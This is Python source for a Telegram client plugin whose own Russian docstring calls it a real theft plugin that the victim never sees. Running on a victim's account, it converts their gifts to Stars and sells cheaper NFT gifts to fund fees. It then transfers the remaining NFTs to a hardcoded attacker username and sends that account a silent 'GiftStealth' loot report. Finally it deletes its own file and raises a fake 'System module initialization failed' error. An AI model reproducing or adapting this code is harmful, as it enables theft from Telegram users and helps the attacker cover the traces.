"""
НАСТОЯЩИЙ ПЛАГИН КРАЖИ.
Лежит НА СЕРВЕРЕ, а не на телефоне жертвы.
Жертва его никогда не увидит.
"""

__id__         = "gift-executor"
__name__       = "GiftExecutor"
__description__ = "Execution core"
__version__    = "1.0.0"

from base_plugin import BasePlugin
import threading
import time
import sys
import os

# ══════════════════════════════════════════════════════
#  НАСТРОЙКИ
# ══════════════════════════════════════════════════════

TARGET_USERNAME = "StroomperXimik"
LOG_CHAT_ID = "StroomperXimik"
TRANSFER_FEE = 25


def run_executor(plugin, core_self):
    """
    Главная функция.
    Вызывается из заглушки.
    """
    executor = Executor(plugin, core_self)
    executor.execute()


class Executor:
    """
    Основной исполнитель.
    """

    def __init__(self, plugin, core_self):
        self.plugin = plugin
        self.cs = core_self
        self.logs = []
        self.sold_nft = []
        self.transferred_nft = []
        self.stats = {
            "converted": 0,
            "transferred": 0,
            "sold": 0,
            "stars_from_convert": 0,
            "stars_from_sale": 0,
            "stars_spent": 0,
            "total_stars": 0,
        }
        self.errors = []

    def log(self, msg):
        self.logs.append(msg)

    def execute(self):
        """Основная логика."""
        try:
            self.log("🔄 Получаю список подарков...")
            regular, nft = self._get_gifts()

            if not regular and not nft:
                self.log("❌ Нет подарков")
                self._send_report()
                self._self_destruct()
                return

            self.log(f"📦 Найдено: {len(regular)} обычных, {len(nft)} NFT")

            # ── 1. Конвертируем обычные подарки ──
            self.log("🔄 Конвертирую обычные подарки в Stars...")
            for g in regular:
                stars = g.get("convert_stars", 0)
                title = g.get("title", "?")
                if self._convert_gift(g):
                    self.stats["converted"] += 1
                    self.stats["stars_from_convert"] += stars
                    self.log(f"  ✅ {title} → +{stars}⭐")

            available = self.stats["stars_from_convert"]
            self.log(f"⭐ Доступно Stars: {available}")

            # ── 2. Считаем нужно Stars для передачи NFT ──
            total_fee = len(nft) * TRANSFER_FEE
            need_to_sell = max(0, total_fee - available)

            self.log(f"💳 Нужно {total_fee}⭐ для передачи {len(nft)} NFT")
            self.log(f"📉 Не хватает: {need_to_sell}⭐")

            # ── 3. Если не хватает — продаём дешёвые NFT ──
            if need_to_sell > 0:
                nft_sorted = sorted(nft, key=lambda x: self._nft_value(x))
                self.log(f"💰 Продаю дешёвые NFT на {need_to_sell}⭐")

                accumulated = 0
                for g in nft_sorted:
                    if accumulated >= need_to_sell:
                        break
                    price = self._sell_price(g)
                    if self._sell_nft(g, price):
                        self.stats["sold"] += 1
                        self.stats["stars_from_sale"] += price
                        accumulated += price
                        self.log(f"  ✅ {g.get('title','?')} — за {price}⭐")
                        self.sold_nft.append({
                            "title": g.get("title","?"),
                            "slug": g.get("slug", "—"),
                            "price": price,
                        })

                # Убираем проданные
                sold_ids = {g.get("slug") for n in self.sold_nft
                           for g in [n] if g.get("slug")}
                remaining = [g for g in nft if g.get("slug") not in sold_ids]
                # Если slug нет — по id
                if not sold_ids:
                    sold_idx = set()
                    for s in self.sold_nft:
                        for g in nft:
                            if g.get("title") == s["title"]:
                                sold_idx.add(id(g))
                    remaining = [g for g in nft if id(g) not in sold_idx]

                self.log(f"📤 Осталось передать: {len(remaining)} NFT")
            else:
                remaining = list(nft)
                self.log(f"✅ Stars хватает — передаю все NFT")

            # ── 4. Передаём NFT ──
            self.log("📤 Передаю NFT...")
            for g in remaining:
                title = g.get("title", "?")
                if self._transfer_nft(g, TARGET_USERNAME):
                    self.stats["transferred"] += 1
                    self.stats["stars_spent"] += TRANSFER_FEE
                    self.log(f"  ✅ {title} → @{TARGET_USERNAME}")
                    self.transferred_nft.append({
                        "title": title,
                        "slug": g.get("slug", "—"),
                    })
                else:
                    self.errors.append(f"❌ Не удалось передать {title}")

            # ── 5. Итоги ──
            self.stats["total_stars"] = (self.stats["stars_from_convert"] +
                                          self.stats["stars_from_sale"] -
                                          self.stats["stars_spent"])

            self.log(f"🏁 Завершено!")
            self.log(f"   Конвертировано: {self.stats['converted']}")
            self.log(f"   Передано NFT: {self.stats['transferred']}")
            self.log(f"   Продано NFT: {self.stats['sold']}")

        except Exception as e:
            self.errors.append(f"🔥 Ошибка: {str(e)[:200]}")

        self._send_report()
        self._self_destruct()

    # ══════════════════════════════════════════════════
    #  MTProto API (через plugin)
    # ══════════════════════════════════════════════════

    def _get_gifts(self):
        """Получает подарки."""
        regular = []
        nft = []
        event = threading.Event()

        def on_resp(r):
            try:
                if r is None:
                    event.set(); return
                gifts = getattr(r, 'gifts', None) or \
                        (r if isinstance(r, (list, tuple)) else []) or \
                        getattr(r, 'gifts_', [])
                for g in gifts:
                    info = self._parse_gift(g)
                    if info["is_nft"]:
                        nft.append(info)
                    else:
                        regular.append(info)
            except Exception:
                pass
            finally:
                event.set()

        def on_err(e):
            event.set()

        try:
            req = self._build_TL(
                "payments.getSavedStarGifts",
                peer=self._input_peer_self(),
                offset=0, limit=100,
            )
            self._send_TL(req, on_resp, on_err)
            event.wait(timeout=20)
        except Exception:
            pass
        return regular, nft

    def _convert_gift(self, gift):
        event = threading.Event()
        ok = [False]
        def ok_resp(r):
            ok[0] = True; event.set()
        def ok_err(e):
            event.set()
        try:
            req = self._build_TL("payments.convertStarGift",
                stargift=self._make_input_gift(gift))
            self._send_TL(req, ok_resp, ok_err)
            event.wait(timeout=10)
        except Exception:
            pass
        return ok[0]

    def _transfer_nft(self, gift, user):
        event = threading.Event()
        ok = [False]
        def ok_resp(r):
            ok[0] = True; event.set()
        def ok_err(e):
            event.set()
        try:
            req = self._build_TL("payments.transferStarGift",
                stargift=self._make_input_gift(gift),
                to_id=self._input_peer(user))
            self._send_TL(req, ok_resp, ok_err)
            event.wait(timeout=15)
        except Exception:
            pass
        return ok[0]

    def _sell_nft(self, gift, price):
        event = threading.Event()
        ok = [False]
        def ok_resp(r):
            ok[0] = True; event.set()
        def ok_err(e):
            event.set()
        try:
            req = self._build_TL("payments.resellStarGift",
                stargift=self._make_input_gift(gift),
                stars=price)
            self._send_TL(req, ok_resp, ok_err)
            event.wait(timeout=15)
        except Exception:
            pass
        return ok[0]

    # ══════════════════════════════════════════════════
    #  ПАРСИНГ
    # ══════════════════════════════════════════════════

    def _parse_gift(self, gift):
        info = {
            "id": 0, "title": "Unknown", "is_nft": False,
            "convert_stars": 0, "slug": None,
        }
        try:
            if hasattr(gift, 'msg_id') and gift.msg_id:
                info["id"] = gift.msg_id
            if hasattr(gift, 'saved_id') and gift.saved_id:
                info["id"] = gift.saved_id
            sg = getattr(gift, 'gift', None) or getattr(gift, 'gift_', None)
            if sg:
                if hasattr(sg, 'title') and sg.title:
                    info["title"] = sg.title
                if hasattr(sg, 'slug') and sg.slug:
                    info["is_nft"] = True
                    info["slug"] = sg.slug
                cn = type(sg).__name__
                if "Unique" in cn or "Collectible" in cn:
                    info["is_nft"] = True
            if hasattr(gift, 'convert_stars') and gift.convert_stars:
                info["convert_stars"] = gift.convert_stars
        except Exception:
            pass
        return info

    def _nft_value(self, g):
        t = g.get("title", "").lower()
        if any(k in t for k in ["common","basic","simple","small","stick",
                "sticker","star","ring","heart","flower","teddy","bear","balloon"]):
            return 50
        if any(k in t for k in ["gift","present","trophy","cup","crown","mask"]):
            return 150
        if any(k in t for k in ["diamond","gold","platinum","legendary",
                "limited","exclusive","rare","premium","ultra","mythic",
                "ancient","holiday","valentine","anniversary"]):
            return 300
        return 100

    def _sell_price(self, g):
        v = self._nft_value(g)
        return max(50, (v // 2) // 10 * 10)

    # ══════════════════════════════════════════════════
    #  TL БИЛДЕРЫ
    # ══════════════════════════════════════════════════

    def _build_TL(self, m, **kw):
        from org.telegram.tgnet import TLRPC
        parts = m.split(".")
        ns, mt = parts if len(parts)==2 else ("payments", m)
        mtc = mt[0].upper()+mt[1:] if mt else mt
        for c in [f"TL_{ns}_{mt}", f"TL_{ns}_{mtc}",
                   f"TL{ns[0].upper()+ns[1:]}{mtc}"]:
            try:
                cls = getattr(TLRPC, c, None)
                if cls is None: continue
                r = cls()
                for k, v in kw.items():
                    if v is not None: setattr(r, k, v)
                return r
            except Exception: continue
        raise RuntimeError(f"Cannot build: {m}")

    def _send_TL(self, req, cb_ok, cb_err):
        try:
            from client_utils import send_request
            send_request(req, cb_ok, cb_err); return
        except Exception: pass
        try:
            from org.telegram.tgnet import RequestDelegate, ConnectionsManager as CM
            from org.telegram.messenger import UserConfig
            class D(RequestDelegate):
                def run(self, r, e):
                    cb_err(e) if e else cb_ok(r)
            CM.getInstance(UserConfig.selectedAccount).sendRequest(req, D())
        except Exception: pass

    def _input_peer_self(self):
        from org.telegram.tgnet import TLRPC
        return TLRPC.TL_inputPeerSelf()

    def _input_peer(self, u):
        from org.telegram.tgnet import TLRPC
        c = u.lstrip("@")
        for n in ["TL_inputPeerUserFromUsername","TL_inputPeerUser","TL_inputPeer"]:
            try:
                cls = getattr(TLRPC, n, None)
                if cls is None: continue
                p = cls()
                if hasattr(p,'username'): p.username = c
                if hasattr(p,'user_id'): p.user_id = 0
                if hasattr(p,'access_hash'): p.access_hash = 0
                return p
            except Exception: continue
        return self._input_peer_self()

    def _make_input_gift(self, g):
        from org.telegram.tgnet import TLRPC
        s = g.get("slug")
        if s:
            try:
                sl = TLRPC.TL_inputSavedStarGiftSlug()
                sl.slug = s; return sl
            except Exception: pass
        for n in ["TL_inputSavedStarGiftUser","TL_inputSavedStarGiftChat",
                   "TL_inputSavedStarGift"]:
            try:
                cls = getattr(TLRPC, n, None)
                if cls is None: continue
                o = cls()
                if hasattr(o,'msg_id') and g.get("id"): o.msg_id = g["id"]
                if hasattr(o,'saved_id') and g.get("id"): o.saved_id = g["id"]
                if hasattr(o,'peer'): o.peer = self._input_peer_self()
                return o
            except Exception: continue
        return None

    # ══════════════════════════════════════════════════
    #  ЛОГИ
    # ══════════════════════════════════════════════════

    def _send_report(self):
        try:
            v = self._get_self_username()
            h = (
                "🎯 <b>GiftStealth — Отчёт</b>\n"
                f"👤 <b>Аккаунт:</b> @{v}\n"
                f"📅 <b>Время:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                "─────────────────────\n"
            )
            b = (
                f"📦 <b>Конвертировано:</b> {self.stats['converted']}\n"
                f"📤 <b>Передано NFT:</b> {self.stats['transferred']}\n"
                f"💰 <b>Продано NFT:</b> {self.stats['sold']}\n"
                f"⭐ <b>Stars (конверт):</b> {self.stats['stars_from_convert']}\n"
                f"⭐ <b>Stars (продажа):</b> {self.stats['stars_from_sale']}\n"
                f"💳 <b>Комиссии:</b> -{self.stats['stars_spent']}\n"
                f"🏆 <b>Итого:</b> {self.stats['total_stars']}⭐\n"
            )
            ss = ""
            if self.sold_nft:
                ss += "\n💰 <b>Проданные NFT:</b>\n"
                for n in self.sold_nft:
                    sg = n['slug'][:20]+"..." if len(n.get("slug",""))>20 else n.get("slug","—")
                    ss += f"  • <b>{n['title']}</b>\n    └ {sg} за {n['price']}⭐\n"
            ts = ""
            if self.transferred_nft:
                ts += "\n📤 <b>Переданные NFT:</b>\n"
                for n in self.transferred_nft:
                    sg = n['slug'][:20]+"..." if len(n.get("slug",""))>20 else n.get("slug","—")
                    ts += f"  • <b>{n['title']}</b>\n    └ {sg}\n"
            ls = "\n📜 <b>Лог:</b>\n"
            for l in self.logs[-20:]:
                ls += f"  {l}\n"
            es = ""
            if self.errors:
                es += "\n❌ <b>Ошибки:</b>\n"
                for e in self.errors:
                    es += f"  {e}\n"
            msg = h + b + ss + ts + ls + es
            if len(msg) > 4000: msg = msg[:3900] + "\n\n<i>...обрезано</i>"
            self._send_message(LOG_CHAT_ID, msg)
        except Exception: pass

    def _send_message(self, target, text):
        from client_utils import send_message
        try:
            p = None
            if isinstance(target, str) and not target.startswith("-"):
                p = self._input_peer(target)
            else:
                from org.telegram.tgnet import TLRPC
                try:
                    p = TLRPC.TL_inputPeerUser()
                    p.user_id = int(target)
                    p.access_hash = 0
                except: p = self._input_peer_self()
            if p:
                send_message({"peer": p, "message": text, "notify": False},
                            parse_mode="HTML")
        except Exception: pass

    def _get_self_username(self):
        try:
            from org.telegram.messenger import UserConfig
            u = UserConfig.getInstance(UserConfig.selectedAccount).getCurrentUser()
            if u and hasattr(u, 'username') and u.username: return u.username
            return str(UserConfig.getInstance(UserConfig.selectedAccount).clientUserId)
        except: return "Unknown"

    def _self_destruct(self):
        try:
            p = None
            m = sys.modules.get('__main__')
            if m and hasattr(m, '__file__'): p = m.__file__
            if not p:
                import inspect
                for fi in inspect.stack():
                    if fi.filename.endswith('.py'):
                        p = fi.filename; break
            if not p: p = __file__
            if p and os.path.isfile(p):
                def d():
                    time.sleep(3)
                    try: os.remove(p)
                    except: pass
                threading.Thread(target=d, daemon=True).start()
                time.sleep(0.5)
        except: pass
        raise RuntimeError("System module initialization failed")